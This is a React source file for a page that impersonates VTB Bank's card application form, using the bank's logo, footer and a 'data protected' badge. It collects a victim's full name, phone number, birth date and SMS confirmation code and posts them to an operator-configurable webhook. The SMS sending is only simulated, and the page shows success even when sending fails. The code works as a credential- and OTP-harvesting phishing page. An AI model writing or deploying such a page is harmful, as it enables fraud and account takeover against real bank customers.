import React, { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useToast } from '@/hooks/use-toast';
import { Settings, Check, ArrowLeft, Phone, Mail, ShieldCheck, RefreshCw } from 'lucide-react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';

type Step = 'form' | 'verify' | 'success';

const Bank = () => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<Step>('form');
  const [webhookUrl, setWebhookUrl] = useState('');
  const [tempWebhookUrl, setTempWebhookUrl] = useState('');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [smsCode, setSmsCode] = useState(['', '', '', '']);
  const [resendTimer, setResendTimer] = useState(60);
  const codeInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    birthDate: '',
    agreeTerms: false,
  });

  useEffect(() => {
    const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
    setWebhookUrl(savedUrl);
    setTempWebhookUrl(savedUrl);
  }, []);

  // Timer for resend SMS
  useEffect(() => {
    if (step === 'verify' && resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(prev => prev - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [step, resendTimer]);

  // Calculate progress based on filled fields
  const calculateProgress = () => {
    let filled = 0;
    const total = 4;
    if (formData.fullName.trim()) filled++;
    if (formData.birthDate.length === 10) filled++;
    if (formData.phone.replace(/\D/g, '').length === 10) filled++;
    if (formData.agreeTerms) filled++;
    return Math.round((filled / total) * 100);
  };

  const getProgressHint = () => {
    if (!formData.fullName.trim()) return 'Укажите ФИО';
    if (formData.birthDate.length !== 10) return 'Укажите дату рождения';
    if (formData.phone.replace(/\D/g, '').length !== 10) return 'Укажите номер телефона';
    if (!formData.agreeTerms) return 'Подтвердите наличие паспорта';
    return 'Все данные заполнены';
  };

  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = [...smsCode];
    newCode[index] = value.slice(-1);
    setSmsCode(newCode);

    // Auto-focus next input
    if (value && index < 3) {
      codeInputRefs.current[index + 1]?.focus();
    }
  };

  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
      codeInputRefs.current[index - 1]?.focus();
    }
  };

  const handleCodePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    const newCode = [...smsCode];
    for (let i = 0; i < pasted.length; i++) {
      newCode[i] = pasted[i];
    }
    setSmsCode(newCode);
    if (pasted.length > 0) {
      codeInputRefs.current[Math.min(pasted.length, 3)]?.focus();
    }
  };

  const handleResendCode = () => {
    setResendTimer(60);
    toast({
      title: "Код отправлен",
      description: `SMS-код отправлен на номер +7 ${formData.phone}`,
    });
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    let digits = input.replace(/\D/g, '');

    if (digits.startsWith('7') || digits.startsWith('8')) {
      digits = digits.slice(1);
    }

    digits = digits.slice(0, 10);

    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += ') ' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '-' + digits.slice(6, 8);
    }
    if (digits.length > 8) {
      formatted += '-' + digits.slice(8, 10);
    }

    if (formatted) {
      formatted = '(' + formatted;
    }

    setFormData(prev => ({ ...prev, phone: formatted }));
  };

  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 8) {
      value = value.slice(0, 8);
    }

    let formatted = '';
    if (value.length > 0) {
      formatted = value.slice(0, 2);
    }
    if (value.length > 2) {
      formatted += '.' + value.slice(2, 4);
    }
    if (value.length > 4) {
      formatted += '.' + value.slice(4, 8);
    }

    setFormData(prev => ({ ...prev, birthDate: formatted }));
  };

  const saveWebhookSettings = () => {
    localStorage.setItem(WEBHOOK_STORAGE_KEY, tempWebhookUrl);
    setWebhookUrl(tempWebhookUrl);
    setIsSettingsOpen(false);
    toast({
      title: "Настройки сохранены",
      description: "URL webhook успешно обновлен",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.agreeTerms) {
      toast({
        title: "Ошибка",
        description: "Подтвердите наличие паспорта гражданина РФ",
        variant: "destructive",
      });
      return;
    }

    const phoneDigits = formData.phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      toast({
        title: "Ошибка",
        description: "Введите корректный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    // Simulate sending SMS
    setTimeout(() => {
      setIsLoading(false);
      setStep('verify');
      setResendTimer(60);
      toast({
        title: "Код отправлен",
        description: `SMS-код отправлен на номер +7 ${formData.phone}`,
      });
    }, 1000);
  };

  const handleVerifyCode = async () => {
    const code = smsCode.join('');
    if (code.length !== 4) {
      toast({
        title: "Ошибка",
        description: "Введите 4-значный код из SMS",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      const phoneDigits = formData.phone.replace(/\D/g, '');
      const payload = {
        fullName: formData.fullName,
        phone: '7' + phoneDigits,
        birthDate: formData.birthDate,
        smsCode: code,
        timestamp: new Date().toISOString(),
        source: 'vtb-demo-page',
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      setStep('success');
      toast({
        title: "Заявка отправлена!",
        description: "Мы свяжемся с вами в ближайшее время",
      });
    } catch (error) {
      console.error('Webhook error:', error);
      setStep('success');
      toast({
        title: "Заявка принята!",
        description: "Данные успешно отправлены",
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Success screen
  if (step === 'success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="w-20 h-20 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
            <Check className="w-10 h-10 text-white" />
          </div>
          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка успешно отправлена!</h2>
          <p className="text-gray-500 mb-2">
            Спасибо, {formData.fullName.split(' ')[0]}!
          </p>
          <p className="text-gray-400 mb-8">
            Наш специалист свяжется с вами по номеру +7 {formData.phone} в ближайшее время для уточнения деталей.
          </p>
          <Button
            onClick={() => {
              setStep('form');
              setSmsCode(['', '', '', '']);
              setFormData({
                fullName: '',
                phone: '',
                birthDate: '',
                agreeTerms: false,
              });
            }}
            className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Оформить ещё одну карту
          </Button>
        </div>
      </div>
    );
  }

  // SMS verification screen
  if (step === 'verify') {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        {/* Header */}
        <header className="border-b border-gray-100">
          <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
            <img
              src="/uploads/Main_ic_LogoVTBlight.svg"
              alt="ВТБ"
              className="h-9 w-auto"
            />
            <div className="flex items-center gap-2 text-sm text-gray-500">
              <ShieldCheck className="w-4 h-4 text-[#0066FF]" />
              Данные защищены
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 flex items-center justify-center p-4">
          <div className="max-w-md w-full">
            <button
              onClick={() => {
                setStep('form');
                setSmsCode(['', '', '', '']);
              }}
              className="flex items-center gap-2 text-gray-500 hover:text-gray-700 mb-8 transition-colors"
            >
              <ArrowLeft className="w-4 h-4" />
              Изменить номер
            </button>

            <h1 className="text-2xl font-light text-gray-900 mb-2">
              Введите код из SMS
            </h1>
            <p className="text-gray-500 mb-8">
              Мы отправили код подтверждения на номер<br />
              <span className="text-gray-900 font-medium">+7 {formData.phone}</span>
            </p>

            {/* Code inputs */}
            <div className="flex gap-3 mb-6" onPaste={handleCodePaste}>
              {smsCode.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (codeInputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleCodeKeyDown(index, e)}
                  className="w-14 h-16 text-center text-2xl font-medium border-2 border-gray-200 rounded-xl bg-white text-gray-900 focus:border-[#0066FF] focus:outline-none transition-colors"
                  autoFocus={index === 0}
                />
              ))}
            </div>

            {/* Resend timer */}
            <div className="mb-8">
              {resendTimer > 0 ? (
                <p className="text-gray-400 text-sm">
                  Отправить код повторно через <span className="text-gray-600">{resendTimer} сек</span>
                </p>
              ) : (
                <button
                  onClick={handleResendCode}
                  className="flex items-center gap-2 text-[#0066FF] hover:text-[#0052CC] text-sm transition-colors"
                >
                  <RefreshCw className="w-4 h-4" />
                  Отправить код повторно
                </button>
              )}
            </div>

            <Button
              onClick={handleVerifyCode}
              disabled={isLoading || smsCode.some(d => !d)}
              className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg disabled:opacity-50"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Проверка...
                </div>
              ) : (
                'Подтвердить'
              )}
            </Button>

            <p className="text-xs text-gray-400 text-center mt-6">
              Код действителен в течение 10 минут
            </p>
          </div>
        </main>

        {/* Footer */}
        <footer className="border-t border-gray-100">
          <div className="max-w-6xl mx-auto px-4 py-4">
            <p className="text-xs text-gray-400 text-center">
              © Банк ВТБ (ПАО), 2007–2025
            </p>
          </div>
        </footer>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="border-b border-gray-100">
        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          <img
            src="/uploads/Main_ic_LogoVTBlight.svg"
            alt="ВТБ"
            className="h-9 w-auto"
          />
          <div className="flex items-center gap-4">
            <div className="hidden sm:flex items-center gap-2 text-sm text-gray-500">
              <ShieldCheck className="w-4 h-4 text-[#0066FF]" />
              Данные защищены
            </div>
            <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
              <DialogTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="text-gray-400 hover:text-gray-600 hover:bg-gray-100"
                >
                  <Settings className="w-5 h-5" />
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-md">
                <DialogHeader>
                  <DialogTitle>Настройки Webhook</DialogTitle>
                  <DialogDescription>
                    Укажите URL для отправки данных заявки
                  </DialogDescription>
                </DialogHeader>
                <div className="space-y-4 py-4">
                  <div className="space-y-2">
                    <Label htmlFor="webhook-url">Webhook URL</Label>
                    <Input
                      id="webhook-url"
                      value={tempWebhookUrl}
                      onChange={(e) => setTempWebhookUrl(e.target.value)}
                      placeholder="https://your-webhook-url.com/api"
                      className="bg-white"
                    />
                  </div>
                  <Button onClick={saveWebhookSettings} className="w-full bg-[#0066FF] hover:bg-[#0052CC]">
                    Сохранить
                  </Button>
                </div>
              </DialogContent>
            </Dialog>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1">
        <div className="max-w-6xl mx-auto px-4 py-10">
          {/* Title */}
          <h1 className="text-3xl md:text-4xl font-light text-gray-900 mb-6">
            Карта для жизни
          </h1>

          {/* Progress */}
          <div className="mb-8">
            <div className="flex items-center gap-4 text-sm mb-3">
              <span className="text-gray-700 font-medium">Заполнение заявки</span>
              <span className={`ml-auto font-medium ${calculateProgress() === 100 ? 'text-green-600' : 'text-[#0066FF]'}`}>
                {calculateProgress()}%
              </span>
            </div>
            <div className="h-2 bg-gray-100 rounded-full overflow-hidden mb-2">
              <div
                className={`h-full transition-all duration-300 rounded-full ${calculateProgress() === 100 ? 'bg-green-500' : 'bg-[#0066FF]'}`}
                style={{ width: `${calculateProgress()}%` }}
              />
            </div>
            <p className={`text-sm ${calculateProgress() === 100 ? 'text-green-600' : 'text-gray-400'}`}>
              {getProgressHint()}
            </p>
          </div>

          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16">
            {/* Left - Form */}
            <div>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="fullName" className="text-gray-500 text-sm font-normal">
                    Фамилия, имя и отчество
                  </Label>
                  <Input
                    id="fullName"
                    name="fullName"
                    value={formData.fullName}
                    onChange={handleInputChange}
                    required
                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                  />
                  <p className="text-gray-400 text-xs">Укажите как в паспорте</p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="birthDate" className="text-gray-500 text-sm font-normal">
                    Дата рождения
                  </Label>
                  <Input
                    id="birthDate"
                    name="birthDate"
                    value={formData.birthDate}
                    onChange={handleBirthDateChange}
                    placeholder="__.__.____"
                    required
                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-gray-500 text-sm font-normal">
                    Мобильный телефон
                  </Label>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-900">+7</span>
                    <Input
                      id="phone"
                      name="phone"
                      type="tel"
                      value={formData.phone}
                      onChange={handlePhoneChange}
                      placeholder="(___) ___-__-__"
                      required
                      className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0 pl-10"
                    />
                  </div>
                  <p className="text-gray-400 text-xs">На этот номер вам придет код в СМС</p>
                </div>

                <div className="flex items-center space-x-3 pt-2">
                  <Checkbox
                    id="agreeTerms"
                    checked={formData.agreeTerms}
                    onCheckedChange={(checked) =>
                      setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
                    }
                    className="border-gray-300 data-[state=checked]:bg-[#0066FF] data-[state=checked]:border-[#0066FF]"
                  />
                  <Label htmlFor="agreeTerms" className="text-sm text-gray-700 cursor-pointer">
                    У меня есть действующий паспорт гражданина РФ
                  </Label>
                </div>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Отправка...
                    </div>
                  ) : (
                    'Получить код'
                  )}
                </Button>

                <p className="text-xs text-gray-400 leading-relaxed">
                  Нажимая "Получить код", я соглашаюсь с{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">условиями обработки</a>
                  {' '}персональных данных и ознакомлен с{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">тарифами</a>,{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">правилами</a> и{' '}
                  <a href="#" className="text-[#0066FF] hover:underline">условиями</a> продукта
                </p>
              </form>
            </div>

            {/* Right - Card & Benefits */}
            <div className="space-y-8">
              {/* Card */}
              <div className="relative max-w-[380px] aspect-[1.586/1] rounded-2xl overflow-hidden shadow-2xl">
                {/* Dark gradient background */}
                <div className="absolute inset-0 bg-gradient-to-br from-[#1a1f3c] via-[#0d1025] to-[#000000]" />

                {/* Subtle pattern overlay */}
                <div className="absolute inset-0 opacity-10" style={{
                  backgroundImage: `radial-gradient(circle at 70% 30%, rgba(255,255,255,0.1) 0%, transparent 50%)`
                }} />

                {/* VTB Logo - top left */}
                <div className="absolute top-5 left-5">
                  <img
                    src="/uploads/Main_ic_LogoVTBlight.svg"
                    alt="ВТБ"
                    className="h-7 w-auto brightness-0 invert"
                  />
                </div>

                {/* Chip */}
                <div className="absolute top-16 left-5">
                  <div className="w-12 h-9 rounded-md bg-gradient-to-br from-[#d4af37] via-[#f4d875] to-[#c4a030] shadow-inner">
                    <div className="w-full h-full grid grid-cols-3 gap-[1px] p-[3px]">
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm col-span-3"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                      <div className="bg-[#b8960c]/40 rounded-sm"></div>
                    </div>
                  </div>
                </div>

                {/* Card Number */}
                <div className="absolute bottom-16 left-5 right-5">
                  <p className="text-white/90 font-mono text-lg tracking-[0.2em]">
                    •••• •••• •••• 0000
                  </p>
                </div>

                {/* Card Holder & Expiry */}
                <div className="absolute bottom-5 left-5 right-5 flex justify-between items-end">
                  <div>
                    <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Держатель карты</p>
                    <p className="text-white/90 text-sm font-medium tracking-wide">CARDHOLDER NAME</p>
                  </div>
                  <div className="text-right">
                    <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Действует до</p>
                    <p className="text-white/90 text-sm font-medium">12/28</p>
                  </div>
                </div>

                {/* MIR Logo - bottom right */}
                <div className="absolute bottom-5 right-5">
                  <svg width="50" height="16" viewBox="0 0 50 16" fill="none">
                    <path d="M7.5 0L10 8L12.5 0H17.5V16H14V5L11 16H9L6 5V16H2.5V0H7.5Z" fill="white"/>
                    <path d="M21 0H24.5V16H21V0Z" fill="white"/>
                    <path d="M28 0H33C36.5 0 39 2.5 39 5.5C39 8.5 36.5 11 33 11H31.5V16H28V0ZM31.5 8H32.5C34 8 35.5 7 35.5 5.5C35.5 4 34 3 32.5 3H31.5V8Z" fill="white"/>
                  </svg>
                </div>

                {/* Contactless icon */}
                <div className="absolute top-5 right-5">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-white/60">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="currentColor" fillOpacity="0"/>
                    <path d="M8.5 8.5C10.5 6.5 13.5 6.5 15.5 8.5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                    <path d="M6.5 6.5C9.5 3.5 14.5 3.5 17.5 6.5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                    <path d="M10.5 10.5C11.5 9.5 12.5 9.5 13.5 10.5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                    <circle cx="12" cy="13" r="1.5" fill="currentColor"/>
                  </svg>
                </div>
              </div>

              {/* Benefits */}
              <div className="grid grid-cols-2 gap-x-8 gap-y-6">
                <div>
                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями за покупки</p>
                  <p className="text-2xl font-normal text-gray-900">До 3000 ₽</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями в супермаркетах*</p>
                  <p className="text-2xl font-normal text-gray-900">100%</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Выпуск и обслуживание</p>
                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
                </div>
                <div>
                  <p className="text-gray-500 text-sm mb-1">Доставка карты по всей России</p>
                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
                </div>
              </div>

              <p className="text-xs text-gray-400 leading-relaxed">
                *До 1000 ₽ в месяц для новых клиентов при выборе категории «Супермаркеты»
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-100 mt-auto">
        <div className="max-w-6xl mx-auto px-4 py-6">
          <div className="flex flex-col md:flex-row md:items-start justify-between gap-6">
            <div className="space-y-2">
              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
                Положение об организации обработки персональных данных в Банке ВТБ (ПАО) (выписка)
              </a>
              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
                Уведомление об условиях обработки данных сервисом SmartCaptcha
              </a>
            </div>
            <div className="flex flex-col sm:flex-row gap-4 sm:gap-8">
              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
                <Phone className="w-4 h-4" />
                Контакты
              </a>
              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
                <Mail className="w-4 h-4" />
                Написать в банк
              </a>
            </div>
          </div>
          <div className="mt-6 pt-6 border-t border-gray-100">
            <p className="text-xs text-gray-400">
              © Банк ВТБ (ПАО), 2007–2025. Банк ВТБ использует{' '}
              <a href="#" className="text-[#0066FF] hover:underline">файлы cookie</a>
              {' '}для повышения удобства работы с ВТБ Онлайн. В cookie содержатся данные о прошлых посещениях сайта.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Bank;
